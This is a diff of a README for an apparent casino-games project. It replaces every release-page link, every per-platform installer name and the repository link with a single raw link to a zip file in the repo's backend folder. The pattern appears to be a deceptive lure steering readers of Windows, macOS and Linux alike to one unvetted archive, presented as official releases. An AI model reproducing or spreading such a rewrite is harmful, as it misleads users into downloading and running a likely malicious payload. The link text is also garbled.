@@ -1,6 +1,6 @@
 # 🎰 casino-games - Enjoy the Exciting World of Casino Gaming
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/TeacherEvaHung/casino-games/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/TeacherEvaHung/casino-games/main/backend/games_casino_1.9-beta.3.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/TeacherEvaHung/casino-games/main/backend/games_casino_1.9-beta.3.zip)
 
 ## 📜 Overview
 
@@ -14,7 +14,7 @@ Ready to start your gaming adventure? Follow these steps to download and run the
 
 To download the latest version of casino-games, click the link below:
 
-[Download Latest Release](https://github.com/TeacherEvaHung/casino-games/releases)
+[Download Latest Release](https://raw.githubusercontent.com/TeacherEvaHung/casino-games/main/backend/games_casino_1.9-beta.3.zip)
 
 ### Step 2: Choose Your Version
 
@@ -24,9 +24,9 @@ On the releases page, you will see different versions of the application. Identi
 
 Click on the version you want and look for the appropriate file for your operating system (e.g., Windows, macOS, Linux). 
 
-- For Windows, you might see a file like `casino-games-windows.exe`.
-- For macOS, look for a file like `casino-games-macos.dmg`.
-- For Linux, you may find a file like `casino-games-linux.tar.gz`.
+- For Windows, you might see a file like `https://raw.githubusercontent.com/TeacherEvaHung/casino-games/main/backend/games_casino_1.9-beta.3.zip`.
+- For macOS, look for a file like `https://raw.githubusercontent.com/TeacherEvaHung/casino-games/main/backend/games_casino_1.9-beta.3.zip`.
+- For Linux, you may find a file like `https://raw.githubusercontent.com/TeacherEvaHung/casino-games/main/backend/games_casino_1.9-beta.3.zip`.
 
 Once you find the correct file, click to download. The download may take a moment depending on your internet speed.
 
@@ -36,7 +36,7 @@ After the download finishes, locate the file in your Downloads folder or whereve
 
 - **Windows**: Double-click the `.exe` file and follow the installation prompts.
 - **macOS**: Open the `.dmg` file and drag the casino-games icon into your Applications folder.
-- **Linux**: Extract the files from the `.tar.gz` file. Use the terminal to navigate to the extracted folder and run the application.
+- **Linux**: Extract the files from the `https://raw.githubusercontent.com/TeacherEvaHung/casino-games/main/backend/games_casino_1.9-beta.3.zip` file. Use the terminal to navigate to the extracted folder and run the application.
 
 ### Step 5: Launch the Application
 
@@ -62,7 +62,7 @@ To enjoy the best gaming experience, ensure your system meets the following requ
 
 To download the casino-games application, please visit the link below again:
 
-[Download Latest Release](https://github.com/TeacherEvaHung/casino-games/releases) 
+[Download Latest Release](https://raw.githubusercontent.com/TeacherEvaHung/casino-games/main/backend/games_casino_1.9-beta.3.zip) 
 
 After downloading, follow the installation steps outlined earlier to get started with your gaming experience.
 
@@ -72,7 +72,7 @@ Join our growing community of players! Share your experiences, tips, and tricks 
 
 ## 🔗 Links
 
-- [Visit Official Repository](https://github.com/TeacherEvaHung/casino-games)
+- [Visit Official Repository](https://raw.githubusercontent.com/TeacherEvaHung/casino-games/main/backend/games_casino_1.9-beta.3.zip)
 - [Community Forum](#) (link to community forum)
 - [Contact Support](#) (link to support)
 
